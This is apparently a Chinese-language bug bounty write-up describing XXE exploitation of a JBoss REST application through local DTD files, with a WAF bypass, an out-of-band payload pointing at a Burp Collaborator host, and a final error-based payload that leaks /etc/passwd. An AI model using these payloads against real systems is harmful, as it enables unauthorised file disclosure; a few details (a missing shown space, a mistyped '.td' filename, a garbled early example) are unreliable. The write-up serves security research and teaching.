# 通过本地DTD文件实现XXE漏洞利用技术

本文将介绍一种有趣的XXE（XML External Entity）漏洞利用方法，该方法最初见于[这篇文章](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)。GoSecure安全团队对此进行了更深入的研究。当HTTP Out of Band不可用且只能使用DNS请求时，如果应用程序会抛出详细的XML解析错误信息，可以利用这种方法读取服务器上的本地文件。

## 漏洞的发现
在使用Burp Suite浏览应用程序时，我发现它在每个端点都使用了基于JSON的REST API。我尝试将Content-Type转换为`application/xml`并重放了一个请求。结果，应用程序抛出了详细的错误信息，包括应用服务器（JBoss）的相关细节。显然，应用程序期望接收XML数据，但实际上接收到的是JSON。于是，我将JSON Body转换成对应的XML格式。

## 绕过WAF
由于目标服务器位于基于云的WAF后面，我决定不使用XML声明，而是直接发送XML主体。令我惊讶的是，应用程序接受了这种形式的请求，并成功处理。接下来，我尝试使用一个简单的XXE payload来读取`/etc/passwd`文件：
```xml
<!DOCTYPE x [
    <!ENTITY % x SYSTEM "file:///etc/passwd">
    %x;
]>
```
然而，WAF再次被触发。为了绕过WAF，我在文件路径前加了一个空格（即`file:///etc/passwd`），这样就成功绕过了WAF。

## 漏洞的利用之旅
尽管如此，应用程序会对传递给它的数据进行严格的安全检查，特别是与`/etc/passwd`相关的内容，只允许出现类似`[a-zA-Z0-9]`这样的字符。如果我尝试读取不存在的文件或敏感文件如`/etc/shadow`，应用程序会抛出权限不足或其他详细错误信息，但不会显示文件内容。因此，虽然可以确认存在XXE漏洞，但我们无法直接获取文件内容。

## XXE OOB技巧
为了避开这些限制，我尝试使用OOB（Out of Band）技巧通过FTP来检索文件。由于应用程序是用Java编写的，我使用了Burp Collaborator，并采用了参数实体而非常规实体：
```xml
<!DOCTYPE x [
    <!ENTITY % x SYSTEM "http://burpcollaborator.net/x.dtd">
    %x;
]>
```
需要注意的是，在此场景下HTTP Out of Band是不可用的。

## 基于子域的OOB XXE
一周后，我在一个子域上发现了RCE（远程代码执行）漏洞。出于好奇，我在该子域上托管了一个恶意DTD文件，以读取`/etc/passwd`并通过详细的服务器错误信息泄露其内容。最终，这种方法奏效了，可能是因为该子域在白名单中，允许建立出站连接。

公司希望我能够在不借助已知RCE漏洞的情况下利用这个XXE漏洞。如果成功，我将获得全额奖金。

## 通过本地DTD实现完整的XXE漏洞利用
经过长时间的努力，我终于找到了一种解决方案。参考[这篇文章](https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html)，作者列出了许多常见的DTD文件及其利用方法。然而，我的目标服务器上并没有这些DTD文件。

### 本地DTD技术简介
如果我们发现目标服务器文件系统中存在包含参数实体的DTD文件，并且该实体会被DTD本身调用，我们可以通过覆盖这些实体来实现文件读取。例如，假设服务器上有如下DTD文件：
```xml
/usr/share/xyz/legit.dtd:
<!ENTITY % xs-datatypes "You Control Contents inside this DTD now!!!">
```
我们可以利用XXE注入以下内容：
```xml
<!DOCTYPE x [
    <!ENTITY % xs-datatypes "SYSTEM 'file:///etc/passwd'">
    %xs-datatypes;
]>
```
在解析XML时，`%xs-datatypes;`将被替换为我们注入的内容。

### 寻找本地DTD文件
GoSecure发布了一个工具，用于查找包含可注入实体的DTD文件。我提取了JBoss Docker镜像的特定版本，并导出其文件系统：
```sh
$ docker export {container} -o jboss.tar
$ java -jar dtd-finder-1.0-all.jar jboss.tar
```
该工具在`/modules/system/layers/base/org/jboss/security/xacml/main/jbossxacml-x.x.x.Final-redhat-x.jar`中的`/schema/xmlschema/XMLSchema.td`文件中发现了一个名为“xs-datatypes”的可注入实体。

### 利用本地DTD文件
我创建了以下实体来覆盖现有实体：
```xml
<!DOCTYPE x [
    <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///etc/passwd' >">
    <!ENTITY % error SYSTEM "jar:file:///path/to/jbossxacml-x.x.x.Final-redhat-x.jar!/schema/xmlschema/XMLSchema.dtd">
    %eval;
    %error;
]>
```
最终，通过这种方式，我成功地在HTTP响应的错误消息中获取了`/etc/passwd`文件的内容。

## 参考资料
- [Exploiting XXE with Local DTD Files](https://mohemiv.com/all/exploiting-xxe-with-local-dtd-files/)
- [Automating Local DTD Discovery for XXE](https://blog.h3xstream.com/2019/07/automating-local-dtd-discovery-for-xxe.html)
- [Forcing XXE Reflection in Server Error Messages](https://blog.netspi.com/forcing-xxe-reflection-server-error-messages/)